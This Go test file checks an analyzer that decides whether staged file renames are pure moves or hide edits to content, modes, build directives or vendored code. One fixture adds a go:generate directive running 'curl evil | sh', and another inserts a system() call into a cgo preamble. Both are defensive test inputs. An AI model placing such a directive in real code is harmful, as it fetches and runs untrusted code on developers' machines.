package movepurity

import (
	"path"
	"testing"

	"github.com/0b1-PulsarTech/pulsarules_codex/internal/analyzer/pass"
)

type renameCase struct {
	name        string
	head        map[string]string
	staged      map[string]string
	modes       map[string]string
	failHeadDir string
	failTree    string
	failBlob    string
	failStaged  string
	renames     []pass.Rename
	want        bool
	wantVerdict verdict
}

func runRenameCases(t *testing.T, testCases []renameCase) {
	t.Helper()
	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			moves := newMoveContext(testCase.repo(), testCase.renames)
			if got := moves.renameVerdict(
				testCase.renames[0],
			) == verdictPure; got != testCase.want {
				t.Fatalf("renameVerdict() pure = %v, want %v", got, testCase.want)
			}
		})
	}
}

const (
	utilA    = "internal/util/a.go"
	routingA = "internal/routing/a.go"
	utilPkg  = "example.com/m/internal/util"
)

func TestIsPureRename_Gate(t *testing.T) {
	t.Parallel()

	oldYAML, newYAML := "name: a\nport: 80\n", "name: a\nport: 6666\n"
	moveA := []pass.Rename{pair(utilA, routingA)}
	testCases := []renameCase{
		{
			name:    "identical blob moves under a quoted-path-prone name",
			head:    map[string]string{"conf/\u00e9.yaml": "x: 1\n"},
			staged:  map[string]string{"deploy/\u00e9.yaml": "x: 1\n"},
			renames: []pass.Rename{pair("conf/\u00e9.yaml", "deploy/\u00e9.yaml")},
			want:    true,
		},
		{
			name:    "edit to a unicode-named file",
			head:    map[string]string{"conf/\u00e9.yaml": "x: 1\ny: 2\n"},
			staged:  map[string]string{"deploy/\u00e9.yaml": "x: 1\ny: 2\nz: 4\n"},
			renames: []pass.Rename{pair("conf/\u00e9.yaml", "deploy/\u00e9.yaml")},
		},
		{
			name:    "color setting does not hide an edit",
			head:    map[string]string{"conf/a.yaml": oldYAML},
			staged:  map[string]string{"deploy/a.yaml": newYAML},
			renames: []pass.Rename{pair("conf/a.yaml", "deploy/a.yaml")},
		},
		{
			name:    "external diff setting does not hide an edit",
			head:    map[string]string{"conf/a.yaml": oldYAML},
			staged:  map[string]string{"deploy/a.yaml": newYAML},
			renames: []pass.Rename{pair("conf/a.yaml", "deploy/a.yaml")},
		},
		{
			name: "textconv attribute does not hide an edit",
			head: map[string]string{
				".gitattributes": "*.yaml diff=strip\n",
				"conf/a.yaml":    oldYAML,
			},
			staged: map[string]string{
				".gitattributes": "*.yaml diff=strip\n",
				"deploy/a.yaml":  newYAML,
			},
			renames: []pass.Rename{pair("conf/a.yaml", "deploy/a.yaml")},
		},
		{
			name:    "mode change on a moved Go file",
			head:    map[string]string{utilA: "package util\n"},
			staged:  map[string]string{routingA: "package routing\n"},
			modes:   map[string]string{routingA: "100755"},
			renames: moveA,
		},
	}
	runRenameCases(t, testCases)
}

func TestIsPureRename_Gate_NonGoAndModes(t *testing.T) {
	t.Parallel()

	moveA := []pass.Rename{pair(utilA, routingA)}
	testCases := []renameCase{
		{
			name:    "mode change on an identical non-Go blob",
			head:    map[string]string{"a.sh": "echo\n"},
			staged:  map[string]string{"b.sh": "echo\n"},
			modes:   map[string]string{"b.sh": "100755"},
			renames: []pass.Rename{pair("a.sh", "b.sh")},
		},
		{
			name:    "missing staged side",
			head:    map[string]string{utilA: "package util\n"},
			staged:  map[string]string{},
			renames: moveA,
		},
		{
			name: "moved file that fails to parse",
			head: map[string]string{utilA: "package util\n\nfunc Helper() int { return 1 }\n"},
			staged: map[string]string{
				routingA: "package routing\n\nfunc util.Helper() int { return 1 }\n",
			},
			renames: moveA,
		},
		{
			name: "import declared after a function",
			head: map[string]string{utilA: "package util\n\nfunc F() {}\n\nimport \"os\"\n"},
			staged: map[string]string{
				routingA: "package routing\n\nfunc F() {}\n\nimport \"os\"\n",
			},
			renames: moveA,
		},
		{
			name:    "body edit",
			head:    map[string]string{utilA: "package util\n\nfunc F() int { return 1 }\n"},
			staged:  map[string]string{routingA: "package routing\n\nfunc F() int { return 2 }\n"},
			renames: moveA,
		},
		{
			name:    "non-Go edit",
			head:    map[string]string{"a.txt": "x\n"},
			staged:  map[string]string{"b.txt": "y\n"},
			renames: []pass.Rename{pair("a.txt", "b.txt")},
		},
	}
	runRenameCases(t, testCases)
}

func TestIsPureRename_PackageAndDoc(t *testing.T) {
	t.Parallel()

	moveA := []pass.Rename{pair(utilA, routingA)}
	oldHead := "package util\n\nfunc F() int { return 1 }\n"
	testCases := []renameCase{
		{
			name:    "package clause only",
			head:    map[string]string{utilA: oldHead},
			staged:  map[string]string{routingA: "package routing\n\nfunc F() int { return 1 }\n"},
			renames: moveA,
			want:    true,
		},
		{
			name: "reformatting keeps the token stream",
			head: map[string]string{
				utilA: "package util\n\nfunc F(a, b int) int { return a + b }\n",
			},
			staged: map[string]string{
				routingA: "package routing\n\nfunc F(a, b int) int {\n\treturn a +\n\t\tb\n}\n",
			},
			renames: moveA,
			want:    true,
		},
		{
			name:    "doc word Package old becomes Package new",
			head:    map[string]string{utilA: "// Package util does x.\npackage util\n"},
			staged:  map[string]string{routingA: "// Package routing does x.\npackage routing\n"},
			renames: moveA,
			want:    true,
		},
		{
			name: "doc word followed by more identifier is not the word",
			head: map[string]string{utilA: "// Package utility does x.\npackage util\n"},
			staged: map[string]string{
				routingA: "// Package routingity does x.\npackage routing\n",
			},
			renames: moveA,
		},
	}
	runRenameCases(t, testCases)
}

func TestIsPureRename_Directives(t *testing.T) {
	t.Parallel()

	moveA := []pass.Rename{pair(utilA, routingA)}
	oldHead := "package util\n\nfunc F() int { return 1 }\n"
	testCases := []renameCase{
		{
			name:    "doc comment prose edit",
			head:    map[string]string{utilA: "// Package util does x.\npackage util\n"},
			staged:  map[string]string{routingA: "// Package routing does y.\npackage routing\n"},
			renames: moveA,
		},
		{
			name: "import comment dropped with the clause",
			head: map[string]string{
				utilA: "package util // import \"example.com/m/internal/util\"\n",
			},
			staged:  map[string]string{routingA: "package routing\n"},
			renames: moveA,
			want:    true,
		},
		{
			name: "doc comment claim changed",
			head: map[string]string{
				utilA: oldHead + "\n// Sum is safe for concurrent use.\nfunc G() {}\n",
			},
			staged: map[string]string{
				routingA: "package routing\n\nfunc F() int { return 1 }\n\n" +
					"// Sum is NOT safe.\nfunc G() {}\n",
			},
			renames: moveA,
		},
		{
			name: "build constraint changed",
			head: map[string]string{utilA: "//go:build linux\n\n" + oldHead},
			staged: map[string]string{
				routingA: "//go:build ignore\n\npackage routing\n\nfunc F() int { return 1 }\n",
			},
			renames: moveA,
		},
	}
	runRenameCases(t, testCases)
}

func TestIsPureRename_PackageAndComments_Cgo(t *testing.T) {
	t.Parallel()

	moveA := []pass.Rename{pair(utilA, routingA)}
	testCases := []renameCase{
		{
			name: "embed pattern changed",
			head: map[string]string{
				utilA: "package util\n\nimport _ \"embed\"\n\n//go:embed public.txt\n" +
					"var data string\n",
			},
			staged: map[string]string{
				routingA: "package routing\n\nimport _ \"embed\"\n\n//go:embed secret.txt\n" +
					"var data string\n",
			},
			renames: moveA,
		},
		{
			name: "linkname and generate directives added",
			head: map[string]string{
				utilA: "package util\n\nimport _ \"unsafe\"\n\nfunc now() int64\n",
			},
			staged: map[string]string{
				routingA: "package routing\n\nimport _ \"unsafe\"\n\n" +
					"//go:linkname now runtime.nanotime\n" +
					"//go:generate sh -c \"curl evil | sh\"\nfunc now() int64\n",
			},
			renames: moveA,
		},
		{
			name: "cgo preamble edited",
			head: map[string]string{
				utilA: "package util\n\n// static int f(void) { return 1; }\nimport \"C\"\n",
			},
			staged: map[string]string{
				routingA: "package routing\n\n// static int f(void) { system(1); return 1; }\n" +
					"import \"C\"\n",
			},
			renames: moveA,
		},
		{
			name: "cgo preamble untouched by a same-directory rename",
			head: map[string]string{
				utilA: "package util\n\n// static int f(void) { return 1; }\nimport \"C\"\n",
			},
			staged: map[string]string{
				"internal/util/b.go": "package util\n\n// static int f(void) { return 1; }\n" +
					"import \"C\"\n",
			},
			renames: []pass.Rename{pair(utilA, "internal/util/b.go")},
			want:    true,
		},
	}
	runRenameCases(t, testCases)
}

func TestIsPureRename_Inclusion(t *testing.T) {
	t.Parallel()

	const src = "package util\n\nfunc F() {}\n"
	renameTo := func(name, oldPath, newPath string, want bool) renameCase {
		return renameCase{
			name:    name,
			head:    map[string]string{oldPath: src},
			staged:  map[string]string{newPath: src},
			renames: []pass.Rename{pair(oldPath, newPath)},
			want:    want,
		}
	}
	testCases := []renameCase{
		renameTo("into a test file", "internal/util/x.go", "internal/util/x_test.go", false),
		renameTo(
			"into an os-specific file",
			"internal/util/x.go",
			"internal/util/x_windows.go",
			false,
		),
		renameTo("into an ignored name", "internal/util/x.go", "internal/util/_x.go", false),
		renameTo("into an ignored dir", "internal/util/x.go",
			"internal/util/testdata/x.go", false),
		renameTo(
			"out of the Go sources",
			"internal/util/plugin.go",
			"internal/util/plugin.go.orig",
			false,
		),
		renameTo(
			"into the Go sources",
			"internal/util/plugin.go.orig",
			"internal/util/plugin.go",
			false,
		),
		renameTo("a syso into an os-specific one", "internal/util/x.syso",
			"internal/util/x_linux.syso", false),
		renameTo("under another name", "internal/util/x.go", "internal/util/y.go", true),
		renameTo(
			"across directories",
			"internal/util/x_linux.go",
			"internal/util/sub/y_linux.go",
			true,
		),
		renameTo(
			"a data file",
			"internal/util/notes.txt",
			"internal/util/testdata/notes.txt",
			true,
		),
	}
	runRenameCases(t, testCases)
}

func TestIsPureRename_IdenticalBlob(t *testing.T) {
	t.Parallel()

	const (
		leftover = "internal/util/k.go"
		other    = "internal/routing/z.go"
	)
	blobRow := func(name, body string, head, staged map[string]string, want bool) renameCase {
		src := pkgFile("util", body)
		head[utilA], staged[routingA] = src, src
		head[utilStay], staged[utilStay] = "package util\n", "package util\n"
		return renameCase{
			name: name, head: head, staged: staged, renames: moveF(), want: want,
		}
	}
	testCases := []renameCase{
		blobRow("init is loaded from the old directory", "func init() { register() }\n",
			map[string]string{}, map[string]string{}, false),
		blobRow("a predeclared name is declared", "func max(a, b int) int { return a }\n",
			map[string]string{}, map[string]string{}, false),
		blobRow("a dot import", "import . \"strings\"\n\nvar V = ToUpper(\"a\")\n",
			map[string]string{}, map[string]string{}, false),
		blobRow("a blank var initialiser with a call", "var _ = register()\n",
			map[string]string{}, map[string]string{}, false),
		blobRow("a bare name captured by the new directory", useFoo,
			map[string]string{leftover: pkgFile("util", "func Foo() int { return 1 }\n")},
			map[string]string{
				leftover: pkgFile("util", "func Foo() int { return 1 }\n"),
				other:    pkgFile("util", "func Foo() int { return 2 }\n"),
			}, false),
		blobRow("a name whose owner left the new directory", "func Foo() int { return 1 }\n",
			map[string]string{other: pkgFile("other", "func Foo() int { return 2 }\n")},
			map[string]string{}, false),
		blobRow("a plain move into a directory of two package names",
			"func Z() int { return 1 }\n",
			map[string]string{},
			map[string]string{
				"internal/routing/p.go": pkgFile("p", "func P() {}\n"),
				"internal/routing/q.go": pkgFile("q", "func Q() {}\n"),
			}, true),
	}
	runRenameCases(t, testCases)
}

func TestRenameVerdict_Identical(t *testing.T) {
	t.Parallel()

	const initSrc = "package util\n\nfunc init() { register() }\n"
	identical := func(name, from, to, body string, want verdict) renameCase {
		stay := path.Dir(from) + "/stay.go"
		return renameCase{
			name:    name,
			head:    map[string]string{from: body, stay: "package util\n"},
			staged:  map[string]string{to: body, stay: "package util\n"},
			renames: []pass.Rename{pair(from, to)}, wantVerdict: want,
		}
	}
	testCases := []renameCase{
		identical("a c file changes the package that compiles it",
			"a/f.c", "b/f.c", "int f(void){return 1;}\n", verdictUnsafe),
		identical(
			"a syso file",
			"a/r_linux_amd64.syso",
			"b/r_linux_amd64.syso",
			"x",
			verdictUnsafe,
		),
		identical("a header", "a/f.h", "b/f.h", "#define V 1\n", verdictUnsafe),
		identical("an assembly file", "a/f_amd64.s", "b/f_amd64.s", "TEXT x(SB)\n", verdictUnsafe),
		identical("a c file gains a _test suffix in place", "a/seven.c", "a/seven_test.c",
			"int seven(void){return 7;}\n", verdictPure),
		identical("a compiled c file renamed in place", "a/x.c", "a/y.c",
			"int f(void){return 1;}\n", verdictPure),
		identical("a markdown file stays pure", "a/README.md", "b/README.md", "x\n", verdictPure),
		identical("a toolchain file between testdata dirs",
			"a/testdata/f.c", "b/testdata/f.c", "x\n", verdictPure),
		identical("an unparsable fixture between testdata dirs",
			"a/testdata/f.go", "b/testdata/f.go", "package {\n", verdictPure),
		identical("a shared helper between testdata and hidden dirs",
			"a/testdata/h.go", "b/_h/h.go", initSrc, verdictPure),
		identical("a nested vendor file moved into a hidden dir",
			"a/vendor/h.go", "b/_h/h.go", initSrc, verdictInclusion),
		identical("a file moved into the root vendor dir",
			"a/h.go", "vendor/h.go", initSrc, verdictInclusion),
		identical("a file moved out of the root vendor dir",
			"vendor/h.go", "a/h.go", initSrc, verdictInclusion),
		identical("a root vendor file renamed hidden is still flagged",
			"vendor/m/p.go", "vendor/m/_p.go", initSrc, verdictInclusion),
		identical("a root vendor file moved across directories",
			"vendor/m/p.go", "vendor/n/p.go", initSrc, verdictUnsafe),
		identical("a fixture leaving testdata is not ignored",
			"a/testdata/f.go", "b/f.go", "package {\n", verdictInclusion),
		identical("init loaded from the old directory",
			"a/i.go", "b/i.go", initSrc, verdictUnsafe),
		identical("a plain move",
			"a/p.go", "b/p.go", "package util\n\nfunc P() {}\n", verdictPure),
		{
			name: "an edit beyond the move", head: map[string]string{"a/p.go": "package util\n"},
			staged:  map[string]string{"b/p.go": "package util\n\nfunc Q() {}\n"},
			renames: []pass.Rename{pair("a/p.go", "b/p.go")}, wantVerdict: verdictEdited,
		},
	}
	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			moves := newMoveContext(newFakeRepo(testCase.head, testCase.staged), testCase.renames)
			if got := moves.renameVerdict(testCase.renames[0]); got != testCase.wantVerdict {
				t.Fatalf("renameVerdict() = %v, want %v", got, testCase.wantVerdict)
			}
		})
	}
}
